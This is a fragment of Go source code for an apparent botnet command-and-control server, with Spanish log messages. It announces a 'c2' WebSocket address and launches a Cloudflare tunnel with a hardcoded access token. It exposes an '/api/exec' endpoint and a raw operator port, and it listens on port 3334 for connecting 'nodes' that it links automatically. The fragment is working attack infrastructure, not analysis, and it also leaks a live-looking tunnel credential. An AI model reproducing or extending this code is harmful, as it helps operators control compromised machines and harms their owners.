	logMsg(fmt.Sprintf("[+] Usuarios registrados: %s", strings.Join(userList, ", ")))

	fmt.Print(banner())
	fmt.Printf("[+] Servidor iniciado\n")
	fmt.Printf("[+] RAW  : 0.0.0.0:%d (PuTTY RAW)\n", PORT)
	fmt.Printf("[+] WS   : wss://c2.ciphermode.net/ws\n")
	fmt.Printf("[+] DB: SQLite + bcrypt\n")
	fmt.Printf("[+] Usuarios: %s\n", strings.Join(userList, ", "))

	go func() {
		cfToken := "eyJhIjoiMGUyYzZlNTgxYTA0ODFmZWNmMTMxZDY4NGYzYjM1YTciLCJ0IjoiZGJkM2ZhNWUtZDYwZC00MTFhLWE4NmUtMWRlOGRjNTk3ZWZlIiwicyI6Ik9HUmlNVEUwTXpNdFkyTTFaaTAwTnpWbExXRTJOekF0WlRVeE16Y3lNekpoWXpaaSJ9"
		cmd := exec.Command("cloudflared", "tunnel", "--no-autoupdate", "run", "--token", cfToken)
		cmd.Stdout = nil
		cmd.Stderr = nil
		if err := cmd.Start(); err != nil {
			logMsg("[!] Cloudflared no disponible")
			return
		}
		logMsg("[+] Cloudflared tunnel iniciado")
		cmd.Wait()
	}()

	go func() {
		http.HandleFunc("/ws", handleWebSocket)
		http.HandleFunc("/api/exec", handleAPIExec)
		http.HandleFunc("/api/stats", handleAPIStats)
		http.HandleFunc("/", handleDashboard)
		logMsg("[+] WebSocket en 0.0.0.0:8080")
		if err := http.ListenAndServe("0.0.0.0:8080", nil); err != nil {
			logMsg(fmt.Sprintf("[!] Error WS: %v", err))
		}
	}()

	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", PORT))
	if err != nil {
		logMsg(fmt.Sprintf("[!] Error iniciando RAW en %d: %v", PORT, err))
		os.Exit(1)
	}
	defer listener.Close()

	logMsg(fmt.Sprintf("[+] Servidor RAW escuchando en 0.0.0.0:%d", PORT))

	go func() {
		nodeListener, err := net.Listen("tcp", "0.0.0.0:3334")
		if err != nil {
			logMsg(fmt.Sprintf("[!] Error iniciando NODE en 3334: %v", err))
			return
		}
		defer nodeListener.Close()
		logMsg("[+] Servidor NODE escuchando en 0.0.0.0:3334")
		for {
			conn, err := nodeListener.Accept()
			if err != nil {
				continue
			}
			addr := conn.RemoteAddr().String()
			logMsg(fmt.Sprintf("[NODE] Conexion desde %s", addr))
			go handleNode(conn, addr)
		}
	}()

	go autoLinkNodes()

	for {
		conn, err := listener.Accept()
		if err != nil {
			logMsg(fmt.Sprintf("[!] Error aceptando RAW: %v", err))
			continue
		}
		go handleRawClient(conn)
	}
}
